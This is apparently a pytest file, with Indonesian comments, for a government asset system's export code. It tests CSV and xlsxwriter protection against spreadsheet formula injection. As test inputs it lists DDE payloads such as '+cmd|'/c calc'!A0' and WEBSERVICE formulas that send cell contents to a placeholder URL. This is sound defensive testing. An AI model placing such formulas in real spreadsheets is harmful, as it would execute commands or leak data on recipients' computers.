"""Berkas ekspor tidak boleh membawa rumus hidup ke komputer orang lain.

Berkas keluaran AMAN dikirim ke KPKNL, ke auditor, ke satker lain — dan yang
membukanya adalah Excel/LibreOffice di komputer MEREKA. Risikonya berpindah
tangan, bukan tinggal di server kita.

Excel memperlakukan isi sel berawalan `=`, `+`, `-`, `@`, tab, atau CR sebagai
RUMUS. Untuk CSV, mengutip sel TIDAK menolongnya: Excel tetap mem-parsing isi
field terkutip sebagai rumus. Satu nilai `=WEBSERVICE("https://x/?d="&A2)` di
kolom Supplier berubah jadi rumus hidup yang menarik isi sel lain lalu
mengirimkannya keluar.

Dibuktikan langsung terhadap xlsxwriter terpasang: `write()` dengan opsi
bawaan menghasilkan elemen `<f>` (rumus), bukan teks.
"""
import io
import zipfile

import pytest

from shared_utils import netralkan_sel_csv, sel_csv


class TestNetralisasiCsv:
    # `+1` sengaja TIDAK di sini: itu angka biasa, dan uji
    # `test_angka_negatif_tetap_angka` justru menuntutnya tak disentuh.
    # Versi pertama berkas ini memuat keduanya dan saling bertentangan.
    @pytest.mark.parametrize("nilai", ["=1+1", "+cmd|'/c calc'!A0",
                                       "-1+1+cmd|'/c calc'!A0",
                                       "@SUM(A1)", "\tbocor", "\rbocor"])
    def test_awalan_berbahaya_dinetralkan(self, nilai):
        assert netralkan_sel_csv(nilai).startswith("'")

    @pytest.mark.parametrize("nilai", ["Meja Kantor", "3050104001", "0812xxxx",
                                       "PT ABC", ""])
    def test_nilai_wajar_tidak_disentuh(self, nilai):
        assert netralkan_sel_csv(nilai) == nilai

    @pytest.mark.parametrize("nilai", ["-1500000", "-0.5", "+250", "-1,5"])
    def test_angka_negatif_tetap_angka(self, nilai):
        """Tanpa pengecualian ini, koreksi nilai perolehan yang negatif ikut
        jadi teks di Excel — kolom yang seharusnya bisa dijumlahkan auditor
        rusak. Yang berbahaya `-1+1+cmd|...`, bukan `-1500000`."""
        assert netralkan_sel_csv(nilai) == nilai

    def test_none_jadi_kosong(self):
        assert netralkan_sel_csv(None) == ""


class TestKutipCsvBenar:
    def test_kutip_digandakan_bukan_ditukar(self):
        """Dulu kutip ganda di dalam nilai DITUKAR jadi apostrof — mengubah
        data pengguna diam-diam. Aset `Meja "Jati"` terekspor sebagai
        `Meja 'Jati'`, dan perubahan itu tak bisa dikembalikan saat diimpor
        ulang. Aturan CSV yang benar adalah MENGGANDAKAN kutipnya."""
        assert sel_csv('Meja "Jati"') == '"Meja ""Jati"""'
        assert "'" not in sel_csv('Meja "Jati"')

    def test_sel_selalu_terkutip(self):
        assert sel_csv("a,b").startswith('"') and sel_csv("a,b").endswith('"')

    def test_netralisasi_ikut_terbawa(self):
        assert sel_csv("=1+1") == '"\'=1+1"'


class TestBerkasXlsxSungguhan:
    """Bukan memeriksa opsi di sumber, melainkan MEMBUKA berkas yang dihasilkan
    dan melihat apakah selnya berisi elemen rumus."""

    def _sel_xml(self, opsi):
        import xlsxwriter
        buf = io.BytesIO()
        wb = xlsxwriter.Workbook(buf, opsi)
        ws = wb.add_worksheet("X")
        ws.write(0, 0, '=WEBSERVICE("https://contoh/?d="&A2)')
        wb.close()
        z = zipfile.ZipFile(io.BytesIO(buf.getvalue()))
        return z.read("xl/worksheets/sheet1.xml").decode()

    def test_opsi_bawaan_memang_berbahaya(self):
        """Menegaskan premisnya. Bila suatu hari xlsxwriter mengubah
        bawaannya, uji ini gagal dan alasan perbaikan ini perlu ditinjau."""
        assert "<f>" in self._sel_xml({"in_memory": True})

    def test_dengan_opsi_kita_jadi_teks(self):
        xml = self._sel_xml({"in_memory": True, "strings_to_formulas": False})
        assert "<f>" not in xml


class TestSemuaWorkbookMematikannya:
    """Survei menemukan EMPAT pembuat workbook, bukan satu seperti laporan
    awal. Satu yang terlewat sudah cukup membocorkan risikonya kembali."""

    BERKAS = ("routes/exports.py", "routes/reports.py",
              "routes/templates.py", "routes/perencanaan.py")

    @pytest.mark.parametrize("berkas", BERKAS)
    def test_setiap_workbook_mematikan_rumus(self, berkas):
        import os
        p = os.path.join(os.path.dirname(__file__), "..", "..", berkas)
        with open(os.path.abspath(p), encoding="utf-8") as f:
            src = f.read()
        jumlah_wb = src.count("xlsxwriter.Workbook(")
        assert jumlah_wb >= 1
        assert src.count("strings_to_formulas") >= jumlah_wb, (
            f"{berkas}: ada {jumlah_wb} Workbook tetapi "
            f"{src.count('strings_to_formulas')} yang mematikan rumus")

    def test_ekspor_csv_memakai_helper_bersama(self):
        import os
        p = os.path.join(os.path.dirname(__file__), "..", "..", "routes", "exports.py")
        with open(os.path.abspath(p), encoding="utf-8") as f:
            src = f.read()
        assert "sel_csv(item)" in src
        assert "chr(39)" not in src, "penukaran kutip yang merusak data hidup lagi"
